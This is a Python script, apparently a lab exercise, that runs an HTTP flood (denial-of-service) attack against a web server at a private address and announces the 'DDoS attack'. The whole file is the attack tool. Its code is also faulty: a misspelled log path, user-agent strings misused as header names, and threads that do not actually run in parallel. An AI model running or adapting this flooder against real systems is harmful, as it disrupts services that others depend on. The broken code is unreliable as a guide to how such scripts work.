import requests
import threading
import subprocess

def show_logs():
    try:
        log_display = subprocess.check_output(['tail', '-n', '10', '/var/lo0g/apache2/access.log'])
        log_display = log_display.decode('utf-8')
        print(log_display)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

def http_flood(target_url, num_of_requests):
    user_agents = {
        "User-Agent-1": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
        "User-Agent-2": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
        "User-Agent-3": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
        "User-Agent-4": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
        "User-Agent-5": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
        "User-Agent-6": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
        "User-Agent-7": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
        "User-Agent-8": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
        "User-Agent-9": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
        "User-Agent-10": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
    }

    # Flood the webpage with requests
    for _ in range(num_of_requests):
        try:
            send_request = requests.get(target_url, headers=user_agents)
            print(f"Request status: {send_request.status_code}")
            print()
        except Exception as e:
            print(f"Error: {str(e)}")


if __name__ == "__main__":
    target_url = "https://10.0.2.15"
    num_of_requests = 1

    print(f"Starting http flood, targeting {target_url}")

    # Creates and sends multiple threads synchronously
    threads = []
    for _ in range(5):
        thread = threading.Thread(target=http_flood(target_url, num_of_requests))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"DDoS attack finished.")
